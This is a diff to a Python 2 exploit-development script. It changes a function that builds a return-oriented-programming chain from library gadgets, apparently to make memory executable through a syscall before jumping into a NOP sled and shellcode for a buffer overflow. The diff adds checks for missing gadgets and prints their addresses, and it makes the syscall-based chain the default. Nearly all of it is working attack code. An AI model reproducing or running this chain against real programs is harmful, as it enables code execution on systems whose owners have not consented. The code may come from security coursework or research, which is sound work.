@@ -535,54 +535,128 @@ def build_rop_chain_syscall_generic(lib_list):
 def build_rop_chain_libc_syscalls(lib_list):
 
     rop_payload = ""
-   
-    xor_eax_addr = pack_value(find_gadget_addr(lib_list, find_xor_eax_eax))
+  
+    temp = find_gadget_addr(lib_list, find_xor_eax_eax)
+    if temp == 0:
+        print 'Unable to find gadget for xor  eax,eax; ret;'
+        return False 
+    xor_eax_addr = pack_value(temp)
     ret_addr = xor_eax_addr
-    rop_payload += ret_addr 
+    rop_payload += ret_addr
+    print 'Address of xor eax,eax; ret = 0x%x' %(temp)
 
-    dec_eax_addr = pack_value(find_gadget_addr(lib_list, find_dec_eax))
+    
+    temp = find_gadget_addr(lib_list, find_dec_eax)
+    if temp == 0:
+        print 'Unable to find gadget for dec  eax; ret;'
+        return False
+    dec_eax_addr = pack_value(temp)
     rop_payload += dec_eax_addr
+    print 'Address of dec eax; ret = 0x%x' %(temp)
 
-    and_eax_x1000_addr = pack_value(find_gadget_addr(lib_list, find_and_eax_x1000)) 
+
+    temp = find_gadget_addr(lib_list, find_and_eax_x1000)
+    if temp == 0:
+        print 'Unable to find gadget for and eax, 0x1000; ret;'
+        return False
+    and_eax_x1000_addr = pack_value(temp) 
     rop_payload += and_eax_x1000_addr
+    print 'Address of and eax, 0x1000; ret = 0x%x' %(temp)
 
-    mov_ecx_eax_addr = pack_value(find_gadget_addr(lib_list, find_mov_ecx_eax))
+
+    temp = find_gadget_addr(lib_list, find_mov_ecx_eax)
+    if temp == 0:
+        print 'Unable to find gadget for mov ecx, eax; ret;'
+        return False
+    mov_ecx_eax_addr = pack_value(temp)
     rop_payload += mov_ecx_eax_addr
     rop_payload += 4 * pack_value(0x11111111)
+    print 'Address of mov ecx, eax; ret = 0x%x' %(temp)
 
     rop_payload += xor_eax_addr
 
-    mov_edx_eax_addr = pack_value(find_gadget_addr(lib_list, find_mov_edx_eax))
+
+    temp = find_gadget_addr(lib_list, find_mov_edx_eax)
+    if temp == 0:
+        print 'Unable to find gadget for mov edx, eax; ret;'
+        return False
+    mov_edx_eax_addr = pack_value(temp)
     rop_payload += mov_edx_eax_addr
     rop_payload += 3 * pack_value(0x11111111)
+    print 'Address of mov edx, eax; ret = 0x%x' %(temp)
 
-    push_esp_addr = pack_value(find_gadget_addr(lib_list, find_push_esp_pop_ebx))
+
+    temp = find_gadget_addr(lib_list, find_push_esp_pop_ebx)
+    if temp == 0:
+        print 'Unable to find gadget for push esp; pop ebx; ret;'
+        return False
+    push_esp_addr = pack_value(temp)
     rop_payload += push_esp_addr
     rop_payload += pack_value(0x11111111)
+    print 'Address of push esp, pop ebx; ret = 0x%x' %(temp)
 
-    xchg_eax_ebx_addr = pack_value(find_gadget_addr(lib_list, find_xchg_eax_ebx))
+
+    temp = find_gadget_addr(lib_list, find_xchg_eax_ebx)
+    if temp == 0:
+        print 'Unable to find gadget for xchg eax, ebx; ret;'
+        return False
+    xchg_eax_ebx_addr = pack_value(temp)
     rop_payload += xchg_eax_ebx_addr
+    print 'Address of xchg eax, ebx; ret = 0x%x' %(temp)
 
-    and_eax_xff_addr = pack_value(find_gadget_addr(lib_list, find_and_eax_xfffff000))
+
+    temp = find_gadget_addr(lib_list, find_and_eax_xfffff000)
+    if temp == 0:
+        print 'Unable to find gadget for and eax, 0xfffff000; ret;'
+        return False
+    and_eax_xff_addr = pack_value(temp)
     rop_payload += and_eax_xff_addr
     rop_payload += pack_value(0x11111111)
+    print 'Address of and eax, 0xfffff000; ret = 0x%x' %(temp)
+
 
     rop_payload += xchg_eax_ebx_addr
+
 
     rop_payload += xor_eax_addr
 
+
+    temp = find_gadget_addr(lib_list, find_inc_eax)
+    if temp == 0:
+        print 'Unable to find gadget for inc eax; ret;'
+        return False
     inc_eax_addr = pack_value(find_gadget_addr(lib_list, find_inc_eax))
     rop_payload += 7 * inc_eax_addr
+    print 'Address of inc eax; ret = 0x%x' %(temp)
 
-    xchg_eax_edx_addr = pack_value(find_gadget_addr(lib_list, find_xchg_eax_edx))
+
+    temp = find_gadget_addr(lib_list, find_xchg_eax_edx)
+    if temp == 0:
+        print 'Unable to find gadget for xchg eax, edx; ret;'
+        return False
+    xchg_eax_edx_addr = pack_value(temp)
     rop_payload += xchg_eax_edx_addr
+    print 'Address of xchg eax, edx; ret = 0x%x' %(temp)
 
-    add_eax_x20_addr = pack_value(find_gadget_addr(lib_list, find_add_eax_x20))
+
+    temp = find_gadget_addr(lib_list, find_add_eax_x20)
+    if temp == 0:
+        print 'Unable to find gadget for add eax, 0x20; ret;'
+        return False
+    add_eax_x20_addr = pack_value(temp)
     rop_payload += 4 * (add_eax_x20_addr + 2 * pack_value(0x11111111))
+    print 'Address of add eax, 0x20; ret = 0x%x' %(temp)
+
 
     rop_payload += 3 * dec_eax_addr
 
-    syscall_addr = pack_value(find_gadget_addr(lib_list, find_syscall))
+    temp = find_gadget_addr(lib_list, find_syscall)
+    if temp == 0:
+        print 'Unable to find gadget for syscall; ret;'
+        return False
+    syscall_addr = pack_value(temp)
+    print 'Address of syscall; ret = 0x%x' %(temp)
+
 
     nop_len = buf_len + 8 - len(packed_shellcode) - (len(ret_addr) * 10)
     nop_sled = "\x90" * nop_len
@@ -757,6 +831,6 @@ if __name__ == '__main__':
             exit(1)
         lib_list.append((disas_map, base_addr, entry))
     
-    #build_rop_chain_libc_syscalls(lib_list)
-    build_rop_chain_libc(lib_list)
+    build_rop_chain_libc_syscalls(lib_list)
+    #build_rop_chain_libc(lib_list)
     
